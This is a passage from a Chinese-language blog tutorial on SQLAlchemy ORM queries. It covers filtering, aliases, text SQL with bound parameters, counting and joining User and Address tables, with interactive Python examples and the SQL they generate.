class="line">session.delete(jack)</span><br><span class="line">session.commit()</span><br></pre></td></tr></table></figure><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><ol><li><p>基本查询</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> instance <span class="keyword">in</span> session.query(User).order_by(User.id):</span><br><span class="line">print(instance.name, instance.fullname)</span><br><span class="line">wu wu wu xxx xxxx</span><br><span class="line">hu hu xxx xxxx</span><br><span class="line">qi qi xxx xxxx</span><br><span class="line">hg hg xxx xxxx</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).order_by(User.id))) <span class="comment"># 可以通过str查看执行的sql语句</span></span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users ORDER BY users.id</span><br></pre></td></tr></table></figure></li><li><p>可以直接指定要查询的字段，此时查询返回的是一个<code>KeyedTuple</code>对象，可以当做元组那样对待:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> name, fullname <span class="keyword">in</span> session.query(User.name, User.fullname):</span><br><span class="line">print(name, fullname)</span><br><span class="line">wu wu wu xxx xxxx</span><br><span class="line">hu hu xxx xxxx</span><br><span class="line">qi qi xxx xxxx</span><br><span class="line">hg hg xxx xxxx</span><br></pre></td></tr></table></figure></li><li><p>通过<code>lable</code>为字段命别名:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> row <span class="keyword">in</span> session.query(User.name.label(<span class="string">'name_label'</span>)).all():</span><br><span class="line">print(row.name_label)</span><br><span class="line">wu wu</span><br><span class="line">hu</span><br><span class="line">qi</span><br><span class="line">hg</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User.name.label(<span class="string">'name_label'</span>))))</span><br><span class="line">SELECT users.name AS name_label </span><br><span class="line">FROM users</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></li><li><p>aliased为实体命别名:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> aliased</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_alias = aliased(User, name=<span class="string">'user_alias'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> row <span class="keyword">in</span> session.query(user_alias, user_alias.name).all():</span><br><span class="line">print(row.user_alias)</span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(user_alias, user_alias.name)))</span><br><span class="line">SELECT user_alias.id AS user_alias_id, user_alias.name AS user_alias_name, user_alias.fullname AS user_alias_fullname, user_alias.password AS user_alias_password </span><br><span class="line">FROM users AS user_alias</span><br></pre></td></tr></table></figure></li><li><p>limit offset 指定偏移和结果数目</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).order_by(User.id).limit(<span class="number">2</span>).offset(<span class="number">1</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).order_by(User.id).limit(<span class="number">2</span>).offset(<span class="number">1</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users ORDER BY users.id </span><br><span class="line"> LIMIT %s, %s</span><br></pre></td></tr></table></figure></li><li><p>Query对象是完全生成的，他返回的是一个新的Query对象，可继续使用查询语句</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> user <span class="keyword">in</span> session.query(User).\</span><br><span class="line">filter(User.name==<span class="string">'hu'</span>).\</span><br><span class="line">filter(User.fullname==<span class="string">'hu xxx xxxx'</span>):</span><br><span class="line">print(user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name==<span class="string">'hu'</span>).filter(User.fullname==<span class="string">'hu xxx xxxx'</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name = %s AND users.fullname = %s</span><br></pre></td></tr></table></figure><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ol><li>equals/not equals</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># euqals</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name == <span class="string">'wu wu'</span>).first()</span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name == <span class="string">'wu wu'</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name = %s</span><br><span class="line"></span><br><span class="line"><span class="comment"># not equals</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name != <span class="string">'wu wu'</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name != <span class="string">'wu wu'</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name != %s</span><br></pre></td></tr></table></figure><ol><li>like/ilike</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># like（在有的后端不区分大小写，有的区分大小写，如果要不区分大小写，最好用ilike）</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.like(<span class="string">'%wu%'</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name.like(<span class="string">'%wu%'</span>))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name LIKE %s</span><br></pre></td></tr></table></figure><ol><li>in/not in</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># in</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.in_([<span class="string">'wu wu'</span>,<span class="string">'hu'</span>])).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name.in_([<span class="string">'wu wu'</span>,<span class="string">'hu'</span>]))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name IN (%s, %s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># not in</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(~User.name.in_([<span class="string">'wu wu'</span>,<span class="string">'hu'</span>])).all()</span><br><span class="line">[&lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(~User.name.in_([<span class="string">'wu wu'</span>,<span class="string">'hu'</span>]))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name NOT IN (%s, %s)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ol><li>is null/is not null</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># is null</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name == <span class="keyword">None</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'None'</span>, fullname=<span class="string">'None'</span>, password=<span class="string">'None'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name == <span class="keyword">None</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name IS NULL</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.is_(<span class="keyword">None</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'None'</span>, fullname=<span class="string">'None'</span>, password=<span class="string">'None'</span>)&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># is not null</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name != <span class="keyword">None</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.isnot(<span class="keyword">None</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name.isnot(<span class="keyword">None</span>))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name IS NOT NULL</span><br></pre></td></tr></table></figure><ol><li>and/or</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># and</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> and_</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name == <span class="string">'wu wu'</span>,User.fullname == <span class="string">'wu xxx xxxx'</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(and_(User.name == <span class="string">'wu wu'</span>,User.fullname == <span class="string">'wu xxx xxxx'</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name == <span class="string">'wu wu'</span>).filter(User.fullname == <span class="string">'wu xxx xxxx'</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(or_(User.name == <span class="string">'wu wu'</span>, User.name == <span class="string">'hu'</span>)).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br></pre></td></tr></table></figure><ol><li>match/contains</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 有的后端数据库可能不支持</span><br><span class="line">&gt;&gt;&gt; session.query(User).filter(User.name.contains(&apos;u w&apos;)).all()</span><br><span class="line">[&lt;User(name=&apos;wu wu&apos;, fullname=&apos;wu xxx xxxx&apos;, password=&apos;abcdef&apos;)&gt;]</span><br><span class="line">&gt;&gt;&gt; print(str(session.query(User).filter(User.name.contains(&apos;u w&apos;))))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE (users.name LIKE concat(concat(&apos;%%&apos;, %s), &apos;%%&apos;))</span><br></pre></td></tr></table></figure><h2 id="使用文本SQL"><a href="#使用文本SQL" class="headerlink" title="使用文本SQL"></a>使用文本SQL</h2><p><code>Query</code>通过指定它们与<code>text()</code>结合，可以灵活地使用文字字符串 ，这可以被大多数适用的方法所接受。例如， <code>filter()</code>和 <code>order_by()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> user <span class="keyword">in</span> session.query(User).filter(text(<span class="string">"id&lt;5"</span>)).order_by(text(<span class="string">"id"</span>)).all():</span><br><span class="line">print(user.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wu wu</span><br><span class="line">hu</span><br><span class="line">qi</span><br><span class="line">hg</span><br></pre></td></tr></table></figure><p>绑定参数可以使用冒号在基于字符串的SQL中指定。要指定值，可以使用<code>params()</code>方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(text(<span class="string">"id&lt;:value and name=:name"</span>)). \</span><br><span class="line">    params(value=<span class="number">2</span>, name=<span class="string">'wu wu'</span>).order_by(User.id).first()</span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(text(<span class="string">"id&lt;:value and name=:name"</span>)). \</span><br><span class="line">    params(value=<span class="number">2</span>, name=<span class="string">'wu wu'</span>).order_by(User.id)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE id&lt;%s <span class="keyword">and</span> name=%s ORDER BY users.id</span><br></pre></td></tr></table></figure></p><p>名称上的列匹配适用于简单情况，但在处理包含重复列名称的复杂语句时或在使用不易与特定名称匹配的匿名化ORM结构时会变得很难处理。另外，在处理结果行时，我们可能会发现映射列中存在打字行为。对于这些情况，该<code>text()</code>构造允许我们将其文本SQL位置链接到Core或ORM映射列表达式; 可以通过将列表达式作为位置参数传递给<code>TextClause.columns()</code>方法来实现此目的:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stmt = text(<span class="string">"SELECT name, id, fullname, password FROM users where name=:name"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stmt = stmt.columns(User.name, User.id, User.fullname, User.password)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).from_statement(stmt).params(name=<span class="string">'wu wu'</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).from_statement(stmt).params(name=<span class="string">'wu wu'</span>)))</span><br><span class="line">SELECT name, id, fullname, password FROM users where name=%s</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><h2 id="计数"><a href="#计数" class="headerlink" title="计数"></a>计数</h2><p><code>Query</code>有一个便利的计数方法<code>count()</code>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name.like(<span class="string">'%wu'</span>)).count()</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>对于需要特别指出“要计数的东西”的情况，我们可以直接使用表达式指定“计数”函数<code>func.count()</code>，可从<code>func</code>构造中获得:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> func</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(func.count(User.name), User.name).group_by(User.name).all()</span><br><span class="line">[(<span class="number">0</span>, <span class="keyword">None</span>), (<span class="number">1</span>, <span class="string">'hg'</span>), (<span class="number">1</span>, <span class="string">'hu'</span>), (<span class="number">1</span>, <span class="string">'qi'</span>), (<span class="number">1</span>, <span class="string">'wu wu'</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(func.count(User.name), User.name).group_by(User.name)))</span><br><span class="line">SELECT count(users.name) AS count_1, users.name AS users_name </span><br><span class="line">FROM users GROUP BY users.name</span><br></pre></td></tr></table></figure></p><p><code>SELECT  count(*)  FROM  table</code>写法:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(func.count(<span class="string">'*'</span>)).select_from(User).scalar()</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(func.count(<span class="string">'*'</span>)).select_from(User)))</span><br><span class="line">SELECT count(%s) AS count_1 </span><br><span class="line">FROM users</span><br></pre></td></tr></table></figure></p><h2 id="相关对象"><a href="#相关对象" class="headerlink" title="相关对象"></a>相关对象</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>user</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>address1 = Address(email_address=<span class="string">'1111111111@xx.com'</span>,user=user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>address2 = Address(email_address=<span class="string">'2222222222@xx.com'</span>,user=user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.add_all([address1,address2])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.commit()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user.addresses</span><br><span class="line">[&lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;, &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>address1.user</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>address2.user</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>在User上执行查询时并不会将addresses也查询出来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).all()</span><br><span class="line">[&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'None'</span>, fullname=<span class="string">'None'</span>, password=<span class="string">'None'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(session.query(User))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><p>只有当查询user.addresses集合时才会加载，因为使用的是惰性加载</p><h2 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h2><p><code>User</code>和之间的简单隐式连接<code>Address</code>，我们可以使用<code>Query.filter()</code>它们将相关的列等同起来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> u, a <span class="keyword">in</span> session.query(User, Address).\</span><br><span class="line">                        filter(User.id==Address.user_id).\</span><br><span class="line">                        all():</span><br><span class="line">print(u,a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; &lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>使用<code>Query.join()</code>也可以实现上面的查询：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> u, a <span class="keyword">in</span> session.query(User,Address).join(Address).all():</span><br><span class="line">print(u,a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt; &lt;Address(email_address=<span 